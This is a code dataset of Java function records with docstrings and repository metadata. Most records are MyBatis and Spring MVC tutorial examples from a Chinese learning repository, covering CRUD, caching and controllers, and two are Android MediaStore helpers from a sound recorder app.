{"docstring": "//\u81ea\u5b9a\u4e49\u6761\u4ef6\u67e5\u8be2\n", "func_signal": "@Test\npublic void testSelectByExample()", "code": "{\n    ItemsExample itemsExample = new ItemsExample();\n    //\u901a\u8fc7criteria\u6784\u9020\u67e5\u8be2\u6761\u4ef6\n    ItemsExample.Criteria criteria = itemsExample.createCriteria();\n    criteria.andNameEqualTo(\"\u7b14\u8bb0\u672c\");\n    //\u53ef\u80fd\u8fd4\u56de\u591a\u6761\u8bb0\u5f55\n    List<Items> list = itemsMapper.selectByExample(itemsExample);\n\n    System.out.println(list);\n\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis-spring\\test\\com\\iot\\ssm\\mapper\\ItemsMapperTest.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "// \u6dfb\u52a0\u7528\u6237\u4fe1\u606f\n", "func_signal": "@Test\npublic void insertUserTest() throws IOException", "code": "{\n    // mybatis\u914d\u7f6e\u6587\u4ef6\n    String resource = \"SqlMapConfig.xml\";\n    // \u5f97\u5230\u914d\u7f6e\u6587\u4ef6\u6d41\n    InputStream inputStream = Resources.getResourceAsStream(resource);\n\n    // \u521b\u5efa\u4f1a\u8bdd\u5de5\u5382\uff0c\u4f20\u5165mybatis\u7684\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder()\n            .build(inputStream);\n\n    // \u901a\u8fc7\u5de5\u5382\u5f97\u5230SqlSession\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n    // \u63d2\u5165\u7528\u6237\u5bf9\u8c61\n    User user = new User();\n    user.setUsername(\"\u738b\u5c0f\u519b\");\n    user.setBirthday(new Date());\n    user.setSex(\"1\");\n    user.setAddress(\"\u6cb3\u5357\u90d1\u5dde\");\n\n    sqlSession.insert(\"test.insertUser\", user);\n\n    // \u63d0\u4ea4\u4e8b\u52a1\n    sqlSession.commit();\n\n    // \u83b7\u53d6\u7528\u6237\u4fe1\u606f\u4e3b\u952e\n    System.out.println(user.getId());\n    // \u5173\u95ed\u4f1a\u8bdd\n    sqlSession.close();\n\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis\\src\\com\\iot\\mybatis\\first\\MybatisFirst.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "// \u66f4\u65b0\u7528\u6237\u4fe1\u606f\n", "func_signal": "@Test\npublic void updateUserTest() throws IOException", "code": "{\n    // mybatis\u914d\u7f6e\u6587\u4ef6\n    String resource = \"SqlMapConfig.xml\";\n    // \u5f97\u5230\u914d\u7f6e\u6587\u4ef6\u6d41\n    InputStream inputStream = Resources.getResourceAsStream(resource);\n\n    // \u521b\u5efa\u4f1a\u8bdd\u5de5\u5382\uff0c\u4f20\u5165mybatis\u7684\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder()\n            .build(inputStream);\n\n    // \u901a\u8fc7\u5de5\u5382\u5f97\u5230SqlSession\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n    // \u66f4\u65b0\u7528\u6237\u4fe1\u606f\n\n    User user = new User();\n    //\u5fc5\u987b\u8bbe\u7f6eid\n    user.setId(27);\n    user.setUsername(\"\u738b\u5927\u519b\");\n    user.setBirthday(new Date());\n    user.setSex(\"2\");\n    user.setAddress(\"\u6cb3\u5357\u90d1\u5dde\");\n\n    sqlSession.update(\"test.updateUser\", user);\n\n    // \u63d0\u4ea4\u4e8b\u52a1\n    sqlSession.commit();\n\n    // \u5173\u95ed\u4f1a\u8bdd\n    sqlSession.close();\n\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis\\src\\com\\iot\\mybatis\\first\\MybatisFirst.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "// \u5546\u54c1\u5206\u7c7b\n//itemtypes\u8868\u793a\u6700\u7ec8\u5c06\u65b9\u6cd5\u8fd4\u56de\u503c\u653e\u5728request\u4e2d\u7684key\n", "func_signal": "@ModelAttribute(\"itemtypes\")\npublic Map<String, String> getItemTypes()", "code": "{\n\n    Map<String, String> itemTypes = new HashMap<String, String>();\n    itemTypes.put(\"101\", \"\u6570\u7801\");\n    itemTypes.put(\"102\", \"\u6bcd\u5a74\");\n\n    return itemTypes;\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\learnssm-firstssm\\src\\main\\java\\com\\iot\\learnssm\\firstssm\\controller\\ItemsController.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "// \u4e8c\u7ea7\u7f13\u5b58\u6d4b\u8bd5\n", "func_signal": "@Test\npublic void testCache2() throws Exception", "code": "{\n    SqlSession sqlSession1 = sqlSessionFactory.openSession();\n    SqlSession sqlSession2 = sqlSessionFactory.openSession();\n    SqlSession sqlSession3 = sqlSessionFactory.openSession();\n    // \u521b\u5efa\u4ee3\u7406\u5bf9\u8c61\n    UserMapper userMapper1 = sqlSession1.getMapper(UserMapper.class);\n    // \u7b2c\u4e00\u6b21\u53d1\u8d77\u8bf7\u6c42\uff0c\u67e5\u8be2id\u4e3a1\u7684\u7528\u6237\n    User user1 = userMapper1.findUserById(1);\n    System.out.println(user1);\n\n    //\u8fd9\u91cc\u6267\u884c\u5173\u95ed\u64cd\u4f5c\uff0c\u5c06sqlsession\u4e2d\u7684\u6570\u636e\u5199\u5230\u4e8c\u7ea7\u7f13\u5b58\u533a\u57df\n    sqlSession1.close();\n\n//\t\t//\u4f7f\u7528sqlSession3\u6267\u884ccommit()\u64cd\u4f5c\n//\t\tUserMapper userMapper3 = sqlSession3.getMapper(UserMapper.class);\n//\t\tUser user  = userMapper3.findUserById(1);\n//\t\tuser.setUsername(\"\u5f20\u660e\u660e\");\n//\t\tuserMapper3.updateUser(user);\n//\t\t//\u6267\u884c\u63d0\u4ea4\uff0c\u6e05\u7a7aUserMapper\u4e0b\u8fb9\u7684\u4e8c\u7ea7\u7f13\u5b58\n//\t\tsqlSession3.commit();\n//\t\tsqlSession3.close();\n\n    UserMapper userMapper2 = sqlSession2.getMapper(UserMapper.class);\n    // \u7b2c\u4e8c\u6b21\u53d1\u8d77\u8bf7\u6c42\uff0c\u67e5\u8be2id\u4e3a1\u7684\u7528\u6237\n    User user2 = userMapper2.findUserById(1);\n    System.out.println(user2);\n\n    sqlSession2.close();\n\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis\\test\\com\\iot\\mybatis\\mapper\\OrdersMapperCustomTest.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "//\u5b9e\u73b0 \u5bf9queryItems\u65b9\u6cd5\u548curl\u8fdb\u884c\u6620\u5c04\uff0c\u4e00\u4e2a\u65b9\u6cd5\u5bf9\u5e94\u4e00\u4e2aurl\n//\u4e00\u822c\u5efa\u8bae\u5c06url\u548c\u65b9\u6cd5\u5199\u6210\u4e00\u6837\n", "func_signal": "public ModelAndView queryItems(HttpServletRequest request, ItemsQueryVo itemsQueryVo) throws Exception", "code": "{\n    //\u6d4b\u8bd5forward\u540erequest\u662f\u5426\u53ef\u4ee5\u5171\u4eab\n    //System.out.println(request.getParameter(\"id\"));\n\n    //\u8c03\u7528service\u67e5\u627e\u6570\u636e\u5e93\uff0c\u67e5\u8be2\u5546\u54c1\u5217\u8868\n    List<ItemsCustom> itemsList = itemsService.findItemsList(itemsQueryVo);\n\n    //\u8fd4\u56deModelAndView\n    ModelAndView modelAndView = new ModelAndView();\n    //\u76f8\u5f53\u4e8erequest\u7684setAttribute\u65b9\u6cd5,\u5728jsp\u9875\u9762\u4e2d\u901a\u8fc7itemsList\u53d6\u6570\u636e\n    modelAndView.addObject(\"itemsList\", itemsList);\n\n    //\u6307\u5b9a\u89c6\u56fe\n    //\u4e0b\u8fb9\u7684\u8def\u5f84\uff0c\u5982\u679c\u5728\u89c6\u56fe\u89e3\u6790\u5668\u4e2d\u914d\u7f6ejsp\u7684\u8def\u5f84\u524d\u7f00\u548c\u540e\u7f00\uff0c\u4fee\u6539\u4e3aitems/itemsList\n    //modelAndView.setViewName(\"/WEB-INF/jsp/items/itemsList.jsp\");\n    //\u4e0b\u8fb9\u7684\u8def\u5f84\u914d\u7f6e\u5c31\u53ef\u4ee5\u4e0d\u5728\u7a0b\u5e8f\u4e2d\u6307\u5b9ajsp\u8def\u5f84\u7684\u524d\u7f00\u548c\u540e\u7f00\n    modelAndView.setViewName(\"items/itemsList\");\n\n    return modelAndView;\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\learnssm-firstssm\\src\\main\\java\\com\\iot\\learnssm\\firstssm\\controller\\ItemsController.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "// \u6b64\u65b9\u6cd5\u662f\u5728\u6267\u884ctestFindUserById\u4e4b\u524d\u6267\u884c\n", "func_signal": "@Before\npublic void setUp() throws Exception", "code": "{\n    // \u521b\u5efasqlSessionFactory\n\n    // mybatis\u914d\u7f6e\u6587\u4ef6\n    String resource = \"SqlMapConfig.xml\";\n    // \u5f97\u5230\u914d\u7f6e\u6587\u4ef6\u6d41\n    InputStream inputStream = Resources.getResourceAsStream(resource);\n\n    // \u521b\u5efa\u4f1a\u8bdd\u5de5\u5382\uff0c\u4f20\u5165mybatis\u7684\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\n    sqlSessionFactory = new SqlSessionFactoryBuilder()\n            .build(inputStream);\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis\\test\\com\\iot\\mybatis\\dao\\UserDaoImplTest.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "/**\n * @param request\n * @param response\n * @param handler\n * @param ex \u7cfb\u7edf\u629b\u51fa\u7684\u5f02\u5e38\n * @return\n */\n", "func_signal": "public ModelAndView resolveException(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)", "code": "{\n    //handler\u5c31\u662f\u5904\u7406\u5668\u9002\u914d\u5668\u8981\u6267\u884cHandler\u5bf9\u8c61\uff08\u53ea\u6709method\uff09\n    //\u89e3\u6790\u51fa\u5f02\u5e38\u7c7b\u578b\n    //\u5982\u679c\u8be5 \u5f02\u5e38\u7c7b\u578b\u662f\u7cfb\u7edf \u81ea\u5b9a\u4e49\u7684\u5f02\u5e38\uff0c\u76f4\u63a5\u53d6\u51fa\u5f02\u5e38\u4fe1\u606f\uff0c\u5728\u9519\u8bef\u9875\u9762\u5c55\u793a\n    //String message = null;\n    //if(ex instanceof CustomException){\n    //message = ((CustomException)ex).getMessage();\n    //}else{\n    ////\u5982\u679c\u8be5 \u5f02\u5e38\u7c7b\u578b\u4e0d\u662f\u7cfb\u7edf \u81ea\u5b9a\u4e49\u7684\u5f02\u5e38\uff0c\u6784\u9020\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u5f02\u5e38\u7c7b\u578b\uff08\u4fe1\u606f\u4e3a\u201c\u672a\u77e5\u9519\u8bef\u201d\uff09\n    //message=\"\u672a\u77e5\u9519\u8bef\";\n    //}\n\n    //\u4e0a\u8fb9\u4ee3\u7801\u53d8\u4e3a\n    CustomException customException;\n    if (ex instanceof CustomException) {\n        customException = (CustomException) ex;\n    } else {\n        customException = new CustomException(\"\u672a\u77e5\u9519\u8bef\");\n    }\n\n    //\u9519\u8bef\u4fe1\u606f\n    String message = customException.getMessage();\n\n    ModelAndView modelAndView = new ModelAndView();\n\n    //\u5c06\u9519\u8bef\u4fe1\u606f\u4f20\u5230\u9875\u9762\n    modelAndView.addObject(\"message\", message);\n\n    //\u6307\u5411\u9519\u8bef\u9875\u9762\n    modelAndView.setViewName(\"error\");\n\n    return modelAndView;\n\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\learnssm-firstssm\\src\\main\\java\\com\\iot\\learnssm\\firstssm\\exception\\CustomExceptionResolver.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "//\u6839\u636eid\u67e5\u8be2\u7528\u6237\u4fe1\u606f\uff0c\u5f97\u5230\u4e00\u6761\u8bb0\u5f55\u7ed3\u679c\n", "func_signal": "@Test\npublic void findUserByIdTest() throws IOException", "code": "{\n    // mybatis\u914d\u7f6e\u6587\u4ef6\n    String resource = \"SqlMapConfig.xml\";\n    // \u5f97\u5230\u914d\u7f6e\u6587\u4ef6\u6d41\n    InputStream inputStream = Resources.getResourceAsStream(resource);\n    //\u521b\u5efa\u4f1a\u8bdd\u5de5\u5382\uff0c\u4f20\u5165mybatis\u914d\u7f6e\u6587\u4ef6\u7684\u4fe1\u606f\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);\n\n    // \u901a\u8fc7\u5de5\u5382\u5f97\u5230SqlSession\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n\n    // \u901a\u8fc7SqlSession\u64cd\u4f5c\u6570\u636e\u5e93\n    // \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1a\u6620\u5c04\u6587\u4ef6\u4e2dstatement\u7684id\uff0c\u7b49\u4e8e=namespace+\".\"+statement\u7684id\n    // \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1a\u6307\u5b9a\u548c\u6620\u5c04\u6587\u4ef6\u4e2d\u6240\u5339\u914d\u7684parameterType\u7c7b\u578b\u7684\u53c2\u6570\n    // sqlSession.selectOne\u7ed3\u679c \u662f\u4e0e\u6620\u5c04\u6587\u4ef6\u4e2d\u6240\u5339\u914d\u7684resultType\u7c7b\u578b\u7684\u5bf9\u8c61\n    // selectOne\u67e5\u8be2\u51fa\u4e00\u6761\u8bb0\u5f55\n    User user = sqlSession.selectOne(\"test.findUserById\", 1);\n\n    System.out.println(user);\n\n    // \u91ca\u653e\u8d44\u6e90\n    sqlSession.close();\n\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis\\src\\com\\iot\\mybatis\\first\\MybatisFirst.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "//\u8fdb\u5165 Handler\u65b9\u6cd5\u4e4b\u524d\u6267\u884c\n//\u7528\u4e8e\u8eab\u4efd\u8ba4\u8bc1\u3001\u8eab\u4efd\u6388\u6743\n//\u6bd4\u5982\u8eab\u4efd\u8ba4\u8bc1\uff0c\u5982\u679c\u8ba4\u8bc1\u901a\u8fc7\u8868\u793a\u5f53\u524d\u7528\u6237\u6ca1\u6709\u767b\u9646\uff0c\u9700\u8981\u6b64\u65b9\u6cd5\u62e6\u622a\u4e0d\u518d\u5411\u4e0b\u6267\u884c\n", "func_signal": "public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception", "code": "{\n\n    System.out.println(\"HandlerInterceptor1...preHandle\");\n\n    //return false\u8868\u793a\u62e6\u622a\uff0c\u4e0d\u5411\u4e0b\u6267\u884c\n    //return true\u8868\u793a\u653e\u884c\n    return true;\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\learnssm-firstssm\\src\\main\\java\\com\\iot\\learnssm\\firstssm\\interceptor\\HandlerInterceptor1.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "//\u63d2\u5165\n", "func_signal": "@Test\npublic void testInsert()", "code": "{\n    //\u6784\u9020 items\u5bf9\u8c61\n    Items items = new Items();\n    items.setName(\"\u624b\u673a\");\n    items.setPrice(999f);\n    items.setCreatetime(new Date());\n    itemsMapper.insert(items);\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis-spring\\test\\com\\iot\\ssm\\mapper\\ItemsMapperTest.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "// \u67e5\u8be2\u8ba2\u5355\u5173\u8054\u67e5\u8be2\u7528\u6237\uff0c\u7528\u6237\u4fe1\u606f\u4f7f\u7528\u5ef6\u8fdf\u52a0\u8f7d\n", "func_signal": "@Test\npublic void testFindOrdersUserLazyLoading() throws Exception", "code": "{\n    SqlSession sqlSession = sqlSessionFactory.openSession();// \u521b\u5efa\u4ee3\u7406\u5bf9\u8c61\n    OrdersMapperCustom ordersMapperCustom = sqlSession\n            .getMapper(OrdersMapperCustom.class);\n    // \u67e5\u8be2\u8ba2\u5355\u4fe1\u606f\uff08\u5355\u8868\uff09\n    List<Orders> list = ordersMapperCustom.findOrdersUserLazyLoading();\n\n    // \u904d\u5386\u4e0a\u8fb9\u7684\u8ba2\u5355\u5217\u8868\n    for (Orders orders : list) {\n        // \u6267\u884cgetUser()\u53bb\u67e5\u8be2\u7528\u6237\u4fe1\u606f\uff0c\u8fd9\u91cc\u5b9e\u73b0\u6309\u9700\u52a0\u8f7d\n        User user = orders.getUser();\n        System.out.println(user);\n    }\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis\\test\\com\\iot\\mybatis\\mapper\\OrdersMapperCustomTest.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "// \u6839\u636eid\u5220\u9664 \u7528\u6237\u4fe1\u606f\n", "func_signal": "@Test\npublic void deleteUserTest() throws IOException", "code": "{\n    // mybatis\u914d\u7f6e\u6587\u4ef6\n    String resource = \"SqlMapConfig.xml\";\n    // \u5f97\u5230\u914d\u7f6e\u6587\u4ef6\u6d41\n    InputStream inputStream = Resources.getResourceAsStream(resource);\n\n    // \u521b\u5efa\u4f1a\u8bdd\u5de5\u5382\uff0c\u4f20\u5165mybatis\u7684\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder()\n            .build(inputStream);\n\n    // \u901a\u8fc7\u5de5\u5382\u5f97\u5230SqlSession\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n\n    // \u4f20\u5165id\u5220\u9664 \u7528\u6237\n    sqlSession.delete(\"test.deleteUser\", 29);\n\n    // \u63d0\u4ea4\u4e8b\u52a1\n    sqlSession.commit();\n\n    // \u5173\u95ed\u4f1a\u8bdd\n    sqlSession.close();\n\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis\\src\\com\\iot\\mybatis\\first\\MybatisFirst.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "// \u6b64\u65b9\u6cd5\u662f\u5728\u6267\u884ctestFindUserById\u4e4b\u524d\u6267\u884c\n", "func_signal": "@Before\npublic void setUp() throws Exception", "code": "{\n    // \u521b\u5efasqlSessionFactory\n\n    // mybatis\u914d\u7f6e\u6587\u4ef6\n    String resource = \"SqlMapConfig.xml\";\n    // \u5f97\u5230\u914d\u7f6e\u6587\u4ef6\u6d41\n    InputStream inputStream = Resources.getResourceAsStream(resource);\n\n    // \u521b\u5efa\u4f1a\u8bdd\u5de5\u5382\uff0c\u4f20\u5165mybatis\u7684\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\n    sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis\\test\\com\\iot\\mybatis\\mapper\\OrdersMapperCustomTest.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "//\u5728setUp\u8fd9\u4e2a\u65b9\u6cd5\u5f97\u5230spring\u5bb9\u5668\n", "func_signal": "@Before\npublic void setUp() throws Exception", "code": "{\n    applicationContext = new ClassPathXmlApplicationContext(\"classpath:spring/applicationContext.xml\");\n    itemsMapper = (ItemsMapper) applicationContext.getBean(\"itemsMapper\");\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis-spring\\test\\com\\iot\\ssm\\mapper\\ItemsMapperTest.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "//\u6839\u636e\u4e3b\u952e\u67e5\u8be2\n", "func_signal": "@Test\npublic void testSelectByPrimaryKey()", "code": "{\n    Items items = itemsMapper.selectByPrimaryKey(1);\n    System.out.println(items);\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis-spring\\test\\com\\iot\\ssm\\mapper\\ItemsMapperTest.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "// \u6839\u636e\u7528\u6237\u540d\u79f0\u6a21\u7cca\u67e5\u8be2\u7528\u6237\u5217\u8868\n", "func_signal": "@Test\npublic void findUserByNameTest() throws IOException", "code": "{\n    // mybatis\u914d\u7f6e\u6587\u4ef6\n    String resource = \"SqlMapConfig.xml\";\n    // \u5f97\u5230\u914d\u7f6e\u6587\u4ef6\u6d41\n    InputStream inputStream = Resources.getResourceAsStream(resource);\n\n    // \u521b\u5efa\u4f1a\u8bdd\u5de5\u5382\uff0c\u4f20\u5165mybatis\u7684\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder()\n            .build(inputStream);\n\n    // \u901a\u8fc7\u5de5\u5382\u5f97\u5230SqlSession\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n    // list\u4e2d\u7684user\u548c\u6620\u5c04\u6587\u4ef6\u4e2dresultType\u6240\u6307\u5b9a\u7684\u7c7b\u578b\u4e00\u81f4\n    List<User> list = sqlSession.selectList(\"test.findUserByName\", \"\u5c0f\u660e\");\n    System.out.println(list);\n    sqlSession.close();\n\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis\\src\\com\\iot\\mybatis\\first\\MybatisFirst.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "//public List<Orders> getOrdersList() {\n//    return ordersList;\n//}\n//\n//public void setOrdersList(List<Orders> ordersList) {\n//    this.ordersList = ordersList;\n//}\n", "func_signal": "@Override\npublic String toString()", "code": "{\n    return \"User [id=\" + id + \", username=\" + username + \", sex=\" + sex\n            + \", birthday=\" + birthday + \", address=\" + address + \"]\";\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis-spring\\src\\com\\iot\\ssm\\po\\User.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "//\u66f4\u65b0\u6570\u636e\n", "func_signal": "@Test\npublic void testUpdateByPrimaryKey()", "code": "{\n\n    //\u5bf9\u6240\u6709\u5b57\u6bb5\u8fdb\u884c\u66f4\u65b0\uff0c\u9700\u8981\u5148\u67e5\u8be2\u51fa\u6765\u518d\u66f4\u65b0\n    Items items = itemsMapper.selectByPrimaryKey(1);\n\n    items.setName(\"\u624b\u673a\");\n\n    itemsMapper.updateByPrimaryKey(items);\n    //\u5982\u679c\u4f20\u5165\u5b57\u6bb5\u4e0d\u7a7a\u4e3a\u624d\u66f4\u65b0\uff0c\u5728\u6279\u91cf\u66f4\u65b0\u4e2d\u4f7f\u7528\u6b64\u65b9\u6cd5\uff0c\u4e0d\u9700\u8981\u5148\u67e5\u8be2\u518d\u66f4\u65b0\n    //itemsMapper.updateByPrimaryKeySelective(record);\n\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis-spring\\test\\com\\iot\\ssm\\mapper\\ItemsMapperTest.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "// \u4e00\u7ea7\u7f13\u5b58\u6d4b\u8bd5\n", "func_signal": "@Test\npublic void testCache1() throws Exception", "code": "{\n    SqlSession sqlSession = sqlSessionFactory.openSession();// \u521b\u5efa\u4ee3\u7406\u5bf9\u8c61\n    UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n\n    // \u4e0b\u8fb9\u67e5\u8be2\u4f7f\u7528\u4e00\u4e2aSqlSession\n    // \u7b2c\u4e00\u6b21\u53d1\u8d77\u8bf7\u6c42\uff0c\u67e5\u8be2id\u4e3a1\u7684\u7528\u6237\n    User user1 = userMapper.findUserById(1);\n    System.out.println(user1);\n\n    // \u5982\u679csqlSession\u53bb\u6267\u884ccommit\u64cd\u4f5c\uff08\u6267\u884c\u63d2\u5165\u3001\u66f4\u65b0\u3001\u5220\u9664\uff09\uff0c\u6e05\u7a7aSqlSession\u4e2d\u7684\u4e00\u7ea7\u7f13\u5b58\uff0c\u8fd9\u6837\u505a\u7684\u76ee\u7684\u4e3a\u4e86\u8ba9\u7f13\u5b58\u4e2d\u5b58\u50a8\u7684\u662f\u6700\u65b0\u7684\u4fe1\u606f\uff0c\u907f\u514d\u810f\u8bfb\u3002\n\n    ////\u66f4\u65b0user1\u7684\u4fe1\u606f\n    //user1.setUsername(\"\u6d4b\u8bd5\u7528\u623722\");\n    //userMapper.updateUser(user1);\n    ////\u6267\u884ccommit\u64cd\u4f5c\u53bb\u6e05\u7a7a\u7f13\u5b58\n    //sqlSession.commit();\n\n    // \u7b2c\u4e8c\u6b21\u53d1\u8d77\u8bf7\u6c42\uff0c\u67e5\u8be2id\u4e3a1\u7684\u7528\u6237\n    User user2 = userMapper.findUserById(1);\n    System.out.println(user2);\n\n    sqlSession.close();\n\n}", "path": "\u6e90\u7801\\ssm\u5b66\u4e60\u7b14\u8bb0sourcecode\\mybatis\\test\\com\\iot\\mybatis\\mapper\\OrdersMapperCustomTest.java", "repo_name": "muyinchen/woker", "stars": 556, "license": "None", "language": "java", "size": 52033}
{"docstring": "/*\n * Adds file and returns content uri.\n */\n", "func_signal": "private Uri addToMediaDB(File file)", "code": "{\n    Resources res = getResources();\n    ContentValues cv = new ContentValues();\n    long current = System.currentTimeMillis();\n    long modDate = file.lastModified();\n    Date date = new Date(current);\n    SimpleDateFormat formatter = new SimpleDateFormat(\n            res.getString(R.string.audio_db_title_format));\n    String title = formatter.format(date);\n    long sampleLengthMillis = mRecorder.sampleLength() * 1000L;\n\n    // Lets label the recorded audio file as NON-MUSIC so that the file\n    // won't be displayed automatically, except for in the playlist.\n    cv.put(MediaStore.Audio.Media.IS_MUSIC, \"0\");\n\n    cv.put(MediaStore.Audio.Media.TITLE, title);\n    cv.put(MediaStore.Audio.Media.DATA, file.getAbsolutePath());\n    cv.put(MediaStore.Audio.Media.DATE_ADDED, (int) (current / 1000));\n    cv.put(MediaStore.Audio.Media.DATE_MODIFIED, (int) (modDate / 1000));\n    cv.put(MediaStore.Audio.Media.DURATION, sampleLengthMillis);\n    cv.put(MediaStore.Audio.Media.MIME_TYPE, mRequestedType);\n    cv.put(MediaStore.Audio.Media.ARTIST, res.getString(R.string.audio_db_artist_name));\n    cv.put(MediaStore.Audio.Media.ALBUM, res.getString(R.string.audio_db_album_name));\n    Log.d(TAG, \"Inserting audio record: \" + cv.toString());\n    ContentResolver resolver = getContentResolver();\n    Uri base = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;\n    Log.d(TAG, \"ContentURI: \" + base);\n    Uri result = resolver.insert(base, cv);\n    if (result == null) {\n        Log.w(TAG, getString(R.string.error_mediadb_new_record));\n        return null;\n    }\n\n    if (getPlaylistId(res) == -1) {\n        createPlaylist(res, resolver);\n    }\n    int audioId = Integer.valueOf(result.getLastPathSegment());\n    addToPlaylist(resolver, audioId, getPlaylistId(res));\n\n    // Notify those applications such as Music listening to the\n    // scanner events that a recorded audio file just created.\n    sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, result));\n    return result;\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/*\n * Obtain the id for the default play list from the audio_playlists table.\n */\n", "func_signal": "private int getPlaylistId(Resources res)", "code": "{\n    Uri uri = MediaStore.Audio.Playlists.getContentUri(\"external\");\n    final String[] ids = new String[] {\n        MediaStore.Audio.Playlists._ID\n    };\n    final String where = MediaStore.Audio.Playlists.NAME + \"=?\";\n    final String[] args = new String[] {\n        res.getString(R.string.audio_db_playlist_name)\n    };\n    Cursor cursor = query(uri, ids, where, args, null);\n    if (cursor == null) {\n        Log.v(TAG, \"query returns null\");\n    }\n    int id = -1;\n    if (cursor != null) {\n        cursor.moveToFirst();\n        if (!cursor.isAfterLast()) {\n            id = cursor.getInt(0);\n        }\n        cursor.close();\n    }\n    return id;\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
